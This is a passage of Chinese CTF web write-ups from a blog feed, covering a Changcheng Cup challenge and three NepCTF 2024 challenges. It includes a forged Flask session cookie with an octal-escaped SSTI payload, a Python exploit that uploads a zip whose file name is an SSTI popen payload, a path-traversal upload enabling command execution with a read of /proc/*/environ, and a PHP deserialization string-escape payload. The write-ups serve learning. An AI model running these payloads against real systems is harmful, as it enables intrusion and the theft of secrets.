class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-class">.eJwVy0EKgCAQQNG7zLqFKaJ2mZjRGZDQQG0R0d2zv3zwH4i9yT7OgytsQGK0Vc6ScmtSTIoCBUsByesoemaijyKwQE5cRx73vDCVXCddnVvFwj8hwvsBRtoc_w</span><span class="hljs-selector-class">.Zt0UvQ</span>.N_DTzK-e1K7fL8ska6zeBgR_5Ks<br></code></pre></td></tr></table></figure><p>进入admin之后，admin路由可以原型链污染</p><p><img src="/img/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF/12.png"></p><p>由于sold是全局变量，所以可以污染他的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">python .\flask_session_cookie_manager3.py encode -s &quot;a123456&quot; -t &quot;&#123;&#x27;csrf_token&#x27;: &#x27;bf325075b071d0eb0b9b95b9ab82cf22223c8cff&#x27;, &#x27;identity&#x27;: &#x27;guest&#x27;, &#x27;username&#x27;: &#x27;aaa&#x27;,&#x27;__init__&#x27;:&#123;&#x27;__globals__&#x27;:&#123;&#x27;sold&#x27;:500&#125;&#125;&#125;&quot;<br></code></pre></td></tr></table></figure><p>获取到了提示</p><p><img src="/img/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF/13.png"></p><p><img src="/img/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF/14.png"></p><p>发现sold可控，而且可以模版渲染，但是这里还有一个过滤，字母和下划线全部置空。那就可以八进制绕过：</p><p>剩下的就是常规的ssti打法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">python .\flask_session_cookie_manager3.py encode -s &quot;a123456&quot; -t &quot;&#123;&#x27;csrf_token&#x27;: &#x27;bf325075b071d0eb0b9b95b9ab82cf22223c8cff&#x27;, &#x27;identity&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;aaa&#x27;,&#x27;__init__&#x27;:&#123;&#x27;__globals__&#x27;:&#123;&#x27;sold&#x27;:&#x27;&#123;&#123;()[\&#x27;\\137\\137\\143\\154\\141\\163\\163\\137\\137\&#x27;][\&#x27;\\137\\137\\142\\141\\163\\145\\137\\137\&#x27;][\&#x27;\\137\\137\\163\\165\\142\\143\\154\\141\\163\\163\\145\\163\\137\\137\&#x27;]()[132][\&#x27;\\137\\137\\151\\156\\151\\164\\137\\137\&#x27;][\&#x27;\\137\\137\\147\\154\\157\\142\\141\\154\\163\\137\\137\&#x27;][\&#x27;\\160\\157\\160\\145\\156\&#x27;](\&#x27;\\143\\141\\164\\40\\57\\164\\155\\160\\57\\52\\57\\52\\57\\52\\57\\146\\154\\141\\147\&#x27;)[\&#x27;\\162\\145\\141\\144\&#x27;]()&#125;&#125;&#x27;&#125;&#125;&#125;&quot;<br></code></pre></td></tr></table></figure><p>执行的命令是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /tmp/*/*/*/flag<br></code></pre></td></tr></table></figure><p><img src="/img/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF/15.png"></p>]]></content>
    
    
    <categories>
      
      <category>WPs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WPs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NepCTF2024部分web</title>
    <link href="/2024/08/25/NepCTF2024%E9%83%A8%E5%88%86web/"/>
    <url>/2024/08/25/NepCTF2024%E9%83%A8%E5%88%86web/</url>
    
    <content type="html"><![CDATA[<h1 id="NepDouble"><a href="#NepDouble" class="headerlink" title="NepDouble"></a>NepDouble</h1><p>代码过长这里不贴了，看到上传压缩包的第一反应是做一个链接到&#x2F;flag的软连接，上传上去解压就可以看到flag了，但是这里</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> os.path.islink(new_file):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Symbolic links are not allowed.&#x27;</span><br></code></pre></td></tr></table></figure><p>把软连接给ban了，就不能通过文件上传来解决问题了。</p><p>我们注意文件上传的这一段代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">files_list = []<br><span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os.walk(unzip_folder):<br>    <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:<br>        file_path = os.path.join(root, file)<br>        relative_path = os.path.relpath(file_path, app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>])<br>        link = <span class="hljs-string">f&#x27;&lt;a href=&quot;/cat?file=<span class="hljs-subst">&#123;relative_path&#125;</span>&quot;&gt;<span class="hljs-subst">&#123;file&#125;</span>&lt;/a&gt;&#x27;</span><br>        files_list.append(link)<br><span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>.join(files_list))<br></code></pre></td></tr></table></figure><p>link被加入了files_list，然后files_list会被加入网页进行模版渲染，而且link的{file}，也就是文件名我们可控，这就相当于是ssti模版注入了。</p><p>直接上exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> os<br><br>url = <span class="hljs-string">&#x27;https://neptune-26461.nepctf.lemonprefect.cn/&#x27;</span><br><br>payload = <span class="hljs-string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cd ..;cat flag&#x27;).read()&#125;&#125;&quot;</span>  <span class="hljs-comment">#注意斜杠不能用</span><br><br><br>file_path = <span class="hljs-string">f&quot;C:\\Users\\13664\\Desktop\\<span class="hljs-subst">&#123;payload&#125;</span>&quot;</span><br>f = <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;w+&#x27;</span>)<br>f.close()<br><span class="hljs-built_in">zip</span> = zipfile.ZipFile(<span class="hljs-string">r&quot;C:\Users\13664\Desktop\flag.zip&quot;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, zipfile.ZIP_DEFLATED)<br><span class="hljs-built_in">zip</span>.write(file_path)<br><span class="hljs-built_in">zip</span>.close()<br><br>files = &#123;<span class="hljs-string">&#x27;tp_file&#x27;</span>: <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;C:\Users\13664\Desktop\flag.zip&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>)&#125;<br><br>res = requests.post(url=url, files=files)<br><span class="hljs-built_in">print</span>(res.text)<br><br>os.remove(file_path)<br></code></pre></td></tr></table></figure><p>这个题出的挺好的。</p><h1 id="蹦蹦炸弹（boom-it）"><a href="#蹦蹦炸弹（boom-it）" class="headerlink" title="蹦蹦炸弹（boom_it）"></a>蹦蹦炸弹（boom_it）</h1><p>这个题也是一堆障眼法，什么账号密码什么金钱数量都是没用的。主要就是这一段：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin/dashboard&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin_dashboard</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;admin_logged_in&#x27;</span>):<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;admin&#x27;</span>))<br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">in</span> request.files:<br>            file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>        <span class="hljs-keyword">if</span> file.filename == <span class="hljs-string">&#x27;&#x27;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No selected file&#x27;</span><br>        filename = file.filename<br>        file.save(os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File uploaded successfully&#x27;</span><br><br>    cmd_output = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;cmd&#x27;</span> <span class="hljs-keyword">in</span> request.args:<br>        <span class="hljs-keyword">if</span> os.path.exists(<span class="hljs-string">&quot;lock.txt&quot;</span>):  <span class="hljs-comment"># 检查当前目录下是否存在lock.txt</span><br>            cmd = request.args.get(<span class="hljs-string">&#x27;cmd&#x27;</span>)<br>            <span class="hljs-keyword">try</span>:<br>                cmd_output = subprocess.check_output(cmd, shell=<span class="hljs-literal">True</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                cmd_output = <span class="hljs-built_in">str</span>(e)<br>        <span class="hljs-keyword">else</span>:<br>            cmd_output = <span class="hljs-string">&quot;lock.txt not found. Command execution not allowed.&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;admin_dashboard.html&#x27;</span>, users=users, cmd_output=cmd_output, active_tab=<span class="hljs-string">&quot;cmdExecute&quot;</span>)<br></code></pre></td></tr></table></figure><p>首先会验证我是否是admin登录，这里需要伪造jwt，但是key在哪呢？</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">app.secret_key</span> = <span class="hljs-string">&quot;super_secret_key&quot;</span><br></code></pre></td></tr></table></figure><p>这就是key，y1s1我真的服了。</p><p>然后利用flask_session_cookie_manager3.py伪造jwt</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scilab">python .\flask_session_cookie_manager3.py encode -s <span class="hljs-string">&quot;super_secret_key&quot;</span> -t <span class="hljs-string">&quot;&#123;&#x27;</span>username&#x27;:<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin_logged_in&#x27;</span>:True&#125;<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>得到admin的session：eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW5fbG9nZ2VkX2luIjp0cnVlfQ.ZsrqeQ.67ozPrRCkESW85eLT_z39M3RAY4</p><p>打入cookie之后就可以进&#x2F;admin&#x2F;dashboard了。</p><p>这里传入cmd参数就可以执行命令，但是有个前提条件，是当前目录要有lock.txt。然后旁边还有个文件上传的地方，我们这里就需要上传一个lock.txt到当前目录下。</p><p>但是默认上传路径是<code>templates/uploads/</code>，由于这里没有对文件名进行任何过滤，我们可以通过目录穿越的方式把文件传到当前目录。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;../../lock.txt&quot;<br>Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/plain<br><br>aaa<br></code></pre></td></tr></table></figure><p>传入的文件名为<code>../../lock.txt</code>系统就会把lock.txt放到当前目录了。</p><p>然后开始执行命令，这里flag是没有权限读取的。</p><p>故意输入错误命令，令其报错：</p><p><img src="/img/nepctf2024/QQ_1724584341924.png" alt="QQ_1724584341924"></p><p>注意到程序在我们输入的命令前方还拼接了一条GZCTF_FLAG&#x3D;0，这里也就是清理了环境变量里的flag。</p><p>那是不是说明在环境启动的之后，在这条命令执行之前，flag是确确实实存在过环境变量里的呢？</p><p>答案是肯定的，所以我们输入ps命令查看进程启动情况。</p><p>然后cat &#x2F;proc&#x2F;21&#x2F;environ里找到了flag</p><p><img src="/img/nepctf2024/fbb3acf286069218f8fd5be04668cb8f.png" alt="fbb3acf286069218f8fd5be04668cb8f"></p><h1 id="PHP-MASTER"><a href="#PHP-MASTER" class="headerlink" title="PHP_MASTER!!"></a>PHP_MASTER!!</h1><p>基本是做过的很类似的题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>( <span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">substrstr</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$start</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;[&quot;</span>);<br>    <span class="hljs-variable">$end</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mb_substr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$start</span> + <span class="hljs-number">1</span>, <span class="hljs-variable">$end</span> - <span class="hljs-number">1</span> - <span class="hljs-variable">$start</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;key=== <span class="hljs-string">&quot;\0key\0&quot;</span>)&#123;<br>            <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>];<br>            <span class="hljs-variable">$contents</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>);<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$contents</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\[|\]/i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!!!&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">substrstr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep1&#x27;</span>].<span class="hljs-string">&quot;[welcome to&quot;</span>. <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep&#x27;</span>].<span class="hljs-string">&quot;CTF]&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$str</span>===<span class="hljs-string">&#x27;NepCTF]&#x27;</span>)&#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;b) ();<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;s = <span class="hljs-variable">$s</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span> -&gt;str;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]));<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-string">&quot;00&quot;</span>,<span class="hljs-variable">$ser</span>);<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br></code></pre></td></tr></table></figure><p>这道题的A::readflag()方法是没用的，这里读不到flag。而B类最后的<code>return ($this-&gt;b) ();</code>倒是可以执行任意无参方法。这里可以执行phpinfo，flag就在环境变量里。</p><p>C类的<code>echo $this -&gt;str;</code>可以触发B类的<code>__tostring()</code></p><p>这里我们可控的只有C类的$s，而我们想要$str成为B类的一个实例化对象。这里序列化之后的$ser会进去一个replace，\0会变成00，也就是我们传入%00（这是一个字符）,会变成00（两个字符）。可以尝试用字符串逃逸的方法达到效果。</p><p>我们需要的序列化字符串：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;C&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;s&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;str&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;N;&#125;&#125;<br></code></pre></td></tr></table></figure><p>注意我们可控的s后面的部分：<code>&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;N;&#125;&#125;</code>这就是我们需要逃逸的部分，一个%00可以逃逸一个字符，而我们需要逃逸35个字符，就需要35个<code>%00</code></p><p>payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-string">&quot;;s:3:&quot;</span>str<span class="hljs-string">&quot;;O:1:&quot;</span>B<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>b<span class="hljs-string">&quot;;N;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>这样就可以到B类的<code>__tostring()</code>方法了。</p><p>同样的，我们还需要让B类的$b变成phpinfo，照猫画虎，我们需要逃逸的部分是：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">&quot;;s:3:&quot;</span>st<span class="hljs-string">r&quot;;O:1:&quot;</span>B<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span><span class="hljs-string">b&quot;;s:7:&quot;</span>phpinfo<span class="hljs-string">&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>一共47个字符，那么我们就需要47个%00</p><p>payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-string">&quot;;s:3:&quot;</span>str<span class="hljs-string">&quot;;O:1:&quot;</span>B<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>b<span class="hljs-string">&quot;;s:7:&quot;</span>phpinfo<span class="hljs-string">&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\[|\]/i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!!!&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">substrstr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep1&#x27;</span>].<span class="hljs-string">&quot;[welcome to&quot;</span>. <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep&#x27;</span>].<span class="hljs-string">&quot;CTF]&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$str</span>===<span class="hljs-string">&#x27;NepCTF]&#x27;</span>)&#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;b) ();<br>        &#125;<br></code></pre></td></tr></table></figure><p>关于这里面的逃逸，大家可以去看 <a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18310518">https://www.cnblogs.com/EddieMurphy-blogs/p/18310518</a></p><p>这里不再赘述了。主要是注意一下%f0吞字符的取整。</p><p>总payload：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?c=%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%00<span class="hljs-string">&quot;;s:3:&quot;</span>str<span class="hljs-string">&quot;;O:1:&quot;</span>B<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>b<span class="hljs-string">&quot;;s:7:&quot;</span>phpinfo<span class="hljs-string">&quot;;&#125;&#125;&amp;nep1=%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0&amp;nep=NepCTNep</span><br></code></pre></td></tr></table></figure><p><img src="/img/nepctf2024/QQ_1724743182982.png" alt="QQ_1724743182982"></p>]]></content>
    
    
    <categories>
      
      <category>WPs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WPs</tag>
      
    </tags>
    
